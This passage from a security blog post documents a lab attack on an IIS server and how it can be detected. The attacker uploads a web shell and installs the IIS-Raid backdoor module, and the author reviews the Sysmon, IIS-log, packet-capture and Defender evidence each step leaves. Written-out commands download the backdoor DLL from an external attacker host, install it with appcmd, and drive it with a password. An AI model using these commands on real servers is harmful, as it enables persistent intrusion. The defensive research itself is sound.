+<p>Web shells will typically be executed under the IIS worker process (w3wp.exe) using the application pool identity (ex &#8211; IIS AppPool\DefaultAppPool). With IIS, every new site automatically generates its own application pool and associated identity/account unless otherwise specified. These default IIS AppPool accounts will run with very similar permissions to the Network Service account. While the default settings are promising from a hardening perspective, unfortunately administrators/developers will often end up configuring overly permissive settings in the name of &#8220;troubleshooting&#8221; an application during the deployment phase and then these settings end up remaining in place. </p>
+<p>Web shells come in quite a few flavors and there are plenty of examples/projects available online. Kali Linux includes a few useful and reliable (although likely to get detected if used as is!) web shells that can be found in the default /usr/share/webshells directory:</p>
+<p><a href="/wp-content/uploads/2022/09/Kali-Linux-WebShells.png" data-lbwps-width="807" data-lbwps-height="509" data-lbwps-srcsmall="/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png" alt="" width="500" height="315" class="aligncenter size-medium wp-image-5473" srcset="/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png 500w, /wp-content/uploads/2022/09/Kali-Linux-WebShells-768x484.png 768w, /wp-content/uploads/2022/09/Kali-Linux-WebShells.png 807w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>With this being an IIS server, I will be using the cmdasp.aspx web shell. You can see in the screen shot below, that this web shell is sort of just a web based wrapper providing access to cmd.exe:</p>
+<p><a href="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx.png" data-lbwps-width="1277" data-lbwps-height="757" data-lbwps-srcsmall="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png" alt="" width="500" height="296" class="aligncenter size-medium wp-image-5474" srcset="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png 500w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-1024x607.png 1024w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-768x455.png 768w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx.png 1277w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Once the web shell has been uploaded to the server, all the attacker has to do is browse to the /cmdasp.aspx page and they are presented with a simple form that executes the submitted input via cmd.exe. The screenshot below shows what it looks like from the attacker perspective on the remote Kali host running &#8220;whoami &#038;&#038; hostname&#8221;:</p>
+<p><a href="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View.png" data-lbwps-width="933" data-lbwps-height="240" data-lbwps-srcsmall="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png" alt="" width="500" height="129" class="aligncenter size-medium wp-image-5479" srcset="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png 500w, /wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-768x198.png 768w, /wp-content/uploads/2022/09/Kali-Webshell-Attacker-View.png 933w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>On the Windows server, the IIS logs captured this activity as a few POST requests against the /cmdasp.aspx page from the attacker host (192.168.90.214), but the logs are otherwise very limited when it comes to visibility:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1.png" data-lbwps-width="1826" data-lbwps-height="222" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png" alt="" width="500" height="61" class="aligncenter size-medium wp-image-5483" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-1024x124.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-768x93.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-1536x187.png 1536w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1.png 1826w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The Sysmon/Operational logs captured the same activity under Event ID 1 (Process Create):</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1.png" data-lbwps-width="1289" data-lbwps-height="764" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png" alt="" width="500" height="296" class="aligncenter size-medium wp-image-5485" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-1024x607.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-768x455.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1.png 1289w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>There is a lot of useful information here &#8211; Notice the image (c:\windows\system32\cmd.exe), command line (cmd.exe /c whoami &#038;&#038; hostname) and that the parent process is the IIS worker process (w3wp.exe) running under the IIS application pool identity (IIS APPPOOL\iis.robwillis.info).</p>
+<p>As a general rule of thumb, IIS worker processes should not be spawning child processes and even more so when it comes to executables like cmd or PowerShell. This behavior alone is usually enough to warrant a deeper investigation, but that is not to say you won&#8217;t find a fair share of &#8220;legitimate production use cases&#8221;. With this in mind, it should become fairly obvious relatively quickly when activity is not something as simple as creating a daily pdf report from a sql database. </p>
+<p>Taking a look at the packet capture of the web shell activity in Wireshark reveals the rest of the story about what exactly happened here:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit.png" data-lbwps-width="1916" data-lbwps-height="1036" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png" alt="" width="500" height="270" class="aligncenter size-medium wp-image-5487" srcset="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png 500w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-1024x554.png 1024w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-768x415.png 768w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-1536x831.png 1536w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit.png 1916w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Combining all of this information, we now know who the attacker was (192.168.90.214), how they interacted with the server (/cmdasp.aspx), what was requested/executed (cmd.exe /c whoami &#038;&#038; hostname), and what the response was (iis apppool\iis.robwillis.info, VMW-L-IIS01).</p>
+<p>We also have a copy of the web shell since it was uploaded to the server:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-WebShell-Webroot.png" data-lbwps-width="1902" data-lbwps-height="1031" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5589" srcset="/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png 500w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-768x416.png 768w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-1536x833.png 1536w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot.png 1902w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>During the initial manual testing/staging, Windows Defender did happen to grab this particular web shell (cmdasp.aspx) as &#8220;Backdoor:ASP/Webshell&#8221; &#8211; Windows Defender/Operational &#8211; Event ID 1116 (Detected) &#038; 1117 (Action Taken):</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender.png" data-lbwps-width="1730" data-lbwps-height="1013" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png" alt="" width="500" height="293" class="aligncenter size-medium wp-image-5542" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-1024x600.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-768x450.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-1536x899.png 1536w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender.png 1730w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>To keep things moving forward, an exception was created in Defender to allow the shell.</p>
+<h4>IIS Extensions</h4>
+<p>Starting with IIS 7 on Windows Server 2008, Microsoft introduced a modular architecture with a rich set of APIs that allowed developers to extend and customize the functionality of IIS web servers. These IIS extensions support APIs using either native C/C++ or managed C#/VB.NET code structures. IIS extensions will typically be in the form of a dynamic link library (.DLL).</p>
+<p>Microsoft has a wealth of information to help understand what it takes to get started developing IIS Extensions that can be found here:<br>
+<a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/extending-web-server-functionality-in-net" target="_blank" rel="noopener"><strong>https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/extending-web-server-functionality-in-net</strong></a></p>
+<p>Examples of legitimate IIS extensions and use cases:</p>
+<ul>
+<li>Advanced Logging</li>
+<li>Application Request Routing (Load balancer/reverse proxy)</li>
+<li>WinCache</li>
+<li>Dynamic IP Restrictions</li>
+<li>FastCGI</li>
+<li>FTP Publishing Service</li>
+<li>Smooth Streaming</li>
+</ul>
+<p>Examples of malicious IIS Extensions:</p>
+<ul>
+<li><a href="https://github.com/nu11secur1ty/IIS-Backdoor/" target="_blank" rel="noopener"><strong>https://github.com/nu11secur1ty/IIS-Backdoor/</strong></a></li>
+<li><a href="https://github.com/0x09AL/IIS-Raid" target="_blank" rel="noopener"><strong>https://github.com/0x09AL/IIS-Raid</strong></a></li>
+</ul>
+<h3>Compiling &#038; Installing An IIS Extension</h3>
+<h4>IIS-Raid</h4>
+<p>For the extension testing, I am going to be using <a href="https://github.com/0x09AL/IIS-Raid" target="_blank" rel="noopener"><strong>IIS-Raid by 0x09AL</strong></a>. The extension itself is coded in native C++ with a remote controller component written in python. Once installed, the module will process every request sent to the IIS server but will only respond differently if a few special headers and values are passed. MDSec has an in depth blog post on IIS-Raid that can be found here:<br>
+<a href="https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/" target="_blank" rel="noopener"><strong>https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/</strong></a></p>
+<h4>Compiling The Extension</h4>
+<p>Before compiling and using IIS-Raid, some modifications need to be made, starting with the headers in the IIS-Raid-master\module\Functions.h:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Functionsh.png" data-lbwps-width="572" data-lbwps-height="368" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png" alt="" width="500" height="322" class="aligncenter size-medium wp-image-5497" srcset="/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Functionsh.png 572w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Then to build/compile the extension by opening up the solution file (IIS-Backdoor.sln) and going to Build > Build Solution:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Build.png" data-lbwps-width="678" data-lbwps-height="393" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png" alt="" width="500" height="290" class="aligncenter size-medium wp-image-5498" srcset="/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Build.png 678w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Here is the output after building the project, with the extension file being the IIS-Backdoor.dll:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Files.png" data-lbwps-width="829" data-lbwps-height="506" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png" alt="" width="500" height="305" class="aligncenter size-medium wp-image-5499" srcset="/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Files-768x469.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Files.png 829w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Windows Defender did grab the backdoor (IIS-Backdoor.dll) as &#8220;Backdoor:Win32/IISBackdoor.A&#8221; right after compiling &#8211; Windows Defender/Operational &#8211; Event ID 1116 (Detected) &#038; 1117 (Action Taken):</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender.png" data-lbwps-width="1419" data-lbwps-height="808" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png" alt="" width="500" height="285" class="aligncenter size-medium wp-image-5500" srcset="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-1024x583.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-768x437.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender.png 1419w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>Doing a simple string based analysis on the IIS-Backdoor.dll shows plenty of unique strings (including the headers and password) that make basic signature based detection relatively easy:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Strings-2.png" data-lbwps-width="1770" data-lbwps-height="965" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png" alt="" width="500" height="273" class="aligncenter size-medium wp-image-5501" srcset="/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-1024x558.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-768x419.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-1536x837.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2.png 1770w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>It is important to keep in mind that there is absolutely no obfuscation or packing applied to this .dll, which means there is plenty of opportunity to experiment with defense evasion here.</p>
+<h4>Uploading The Extension</h4>
+<p>Now that the extension is compiled, it can be uploaded to the IIS server by leveraging something like PowerShell via the web shell to download the extension from a remote host:</p>
+<pre>powershell invoke-webrequest "http://kali.external-threat.net/iis-backdoor.dll" -Outfile "C:\inetpub\wwwroot\bin\IIS-backdoor.dll"</pre>
+<p>The Sysmon/Operational logs captured this activity in a similar manner to the earlier web shell testing under Event IDs 1 (Process Create) &#038; 11 (File Created):</p>
+<p><a href="/wp-content/uploads/2022/10/IIS-Raid-Upload.png" data-lbwps-width="1191" data-lbwps-height="945" data-lbwps-srcsmall="/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png" alt="" width="500" height="397" class="aligncenter size-medium wp-image-5925" srcset="/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Upload-1024x812.png 1024w, /wp-content/uploads/2022/10/IIS-Raid-Upload-768x609.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Upload.png 1191w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p><a href="/wp-content/uploads/2022/10/IIS-Raid-Upload-2.png" data-lbwps-width="1211" data-lbwps-height="938" data-lbwps-srcsmall="/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png" alt="" width="500" height="387" class="aligncenter size-medium wp-image-5926" srcset="/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2-1024x793.png 1024w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2-768x595.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2.png 1211w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<h4>Installing The IIS Extension Using AppCmd</h4>
+<p>Now that the extension is uploaded to the server, it needs to be installed. There are multiple tools/methods available for this part:</p>
+<ul>
+<li>AppCmd.exe</li>
+<li>Global Assembly Cache (GAC) PowerShell API</li>
+<li>Gacutil.exe</li>
+<li>Manual add via Web.Config</li>
+</ul>
+<p>AppCmd is basically the go to tool for administering IIS 7+ via command line, it is known for being easy to work with and exposes all the key server management features, so that is what I am going to use here.</p>
+<p>Attempting to install the IIS module using AppCmd via the web shell:</p>
+<pre>C:\Windows\system32\inetsrv\appcmd.exe install module /name:IIS-Backdoor-via-appcmd /image:"C:\inetpub\wwwroot\bin\IIS-Backdoor.dll" /add:true</pre>
+<p>Under the default permissions with the default application pool identity, this step fails:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail.png" data-lbwps-width="778" data-lbwps-height="209" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png" alt="" width="500" height="134" class="aligncenter size-medium wp-image-5507" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-768x206.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail.png 778w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>To simulate a privilege escalation or terrible misconfiguration (both of which are very plausible scenarios), the application pool identity was modified from the default account to the local system account:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-AppPool-System.png" data-lbwps-width="1207" data-lbwps-height="318" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png" alt="" width="500" height="132" class="aligncenter size-medium wp-image-5508" srcset="/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png 500w, /wp-content/uploads/2022/09/IIS-AppPool-System-1024x270.png 1024w, /wp-content/uploads/2022/09/IIS-AppPool-System-768x202.png 768w, /wp-content/uploads/2022/09/IIS-AppPool-System.png 1207w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The web shell reflects the change:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell.png" data-lbwps-width="793" data-lbwps-height="203" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png" alt="" width="500" height="128" class="aligncenter size-medium wp-image-5509" srcset="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png 500w, /wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-768x197.png 768w, /wp-content/uploads/2022/09/IIS-AppPool-System-Webshell.png 793w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>And now the extension installs successfully:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success.png" data-lbwps-width="1029" data-lbwps-height="217" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png" alt="" width="500" height="105" class="aligncenter size-medium wp-image-5513" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-1024x216.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-768x162.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success.png 1029w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>All of this activity is still being performed under the web shell, so as expected the Sysmon/Operational logs captured this with Sysmon Event ID 1 (Process Create) under the application pool worker process (w3wp.exe) as nt authority\system with the entire AppCmd command line:  </p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1.png" data-lbwps-width="1285" data-lbwps-height="944" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png" alt="" width="500" height="367" class="aligncenter size-medium wp-image-5510" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-1024x752.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-768x564.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1.png 1285w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The extension is now visible in the IIS Manager under Modules:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager.png" data-lbwps-width="1920" data-lbwps-height="790" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png" alt="" width="500" height="206" class="aligncenter size-medium wp-image-5511" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-1024x421.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-768x316.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-1536x632.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-300x125.png 300w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<h3>Interacting With IIS-Raid</h3>
+<p>Interacting with the IIS server running the IIS-Raid extension is as easy as running the python controller script from the kali/attacker host with the parameters that were specified in the IIS-Raid-master\module\Functions.h earlier:</p>
+<pre># python iis_controller.py --url http://iis.robwillis.info --password RobWasHere --header X-Rob-Variations</pre>
+<p>IIS-Raid has the following commands available:</p>
+<ul>
+<li>Help</li>
+<li>Cmd</li>
+<li>Dump</li>
+<li>Exit</li>
+<li>Inject</li>
+</ul>
+<p>The screenshot below is what it looks like when the attacker connects to and interacts with the backdoor from the remote Kali host running “whoami &#038;&#038; hostname”:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname.png" data-lbwps-width="1617" data-lbwps-height="867" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png" alt="" width="500" height="268" class="aligncenter size-medium wp-image-5580" srcset="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-1024x549.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-768x412.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-1536x824.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname.png 1617w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>On the Windows server, the IIS logs captured a few GET requests from the attacker host (192.168.90.214) against the root site but with no page or file specified, which makes it a little harder to tell what exactly happened here:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs.png" data-lbwps-width="1533" data-lbwps-height="177" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png" alt="" width="500" height="58" class="aligncenter size-medium wp-image-5583" srcset="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png 500w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs-1024x118.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs-768x89.png 768w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs.png 1533w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The Sysmon/Operational logs captured this activity under Event ID 1 (Process Create):</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1.png" data-lbwps-width="1290" data-lbwps-height="766" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png" alt="" width="500" height="297" class="aligncenter size-medium wp-image-5586" srcset="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-1024x608.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-768x456.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1.png 1290w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>This is where I was not sure how extension based activity would look as far as the execution and process chaining, but it ends up looking nearly identical to the web shell activity. Notice the image (c:\windows\system32\cmd.exe), command line (/c whoami &#038;&#038; hostname), and that the parent process is the IIS worker process (w3wp.exe) running under the updated IIS application pool identity (nt authority\system). This means that any existing detections for web shells/w3wp.exe activity are already a step in the right direction.</p>
+<p>Now to take a look at the packet capture in Wireshark:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2.png" data-lbwps-width="1913" data-lbwps-height="1034" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png" alt="" width="500" height="270" class="aligncenter size-medium wp-image-5596" srcset="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-1024x553.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-768x415.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-1536x830.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2.png 1913w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>One of the first items that stands out is that the command was passed using the &#8220;X-Rob-Variations&#8221; header (configured via the Functions.h) and the response appears to be returned utilizing the same header but base64 encoded. Decoding the base64 via PowerShell:</p>
+<pre>
+PS > [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("bnQgYXV0aG9yaXR5XHN5c3RlbQ0KVk1XLUwtSUlTMDENCg=="))
+</pre>
+<p>Reveals the response the attacker observed:<br>
+nt authority\system<br>
+VMW-L-IIS01</p>
+<p>What we are not seeing here, is what exactly the attacker was interacting with. When investigating the web shell activity earlier, we could see that the attacker was interacting with a specific page (cmdasp.aspx), which after manual review, was determined to contain malicious code. With the IIS extension/IIS-Raid, the page that was served up appears to be the web servers default document:</p>
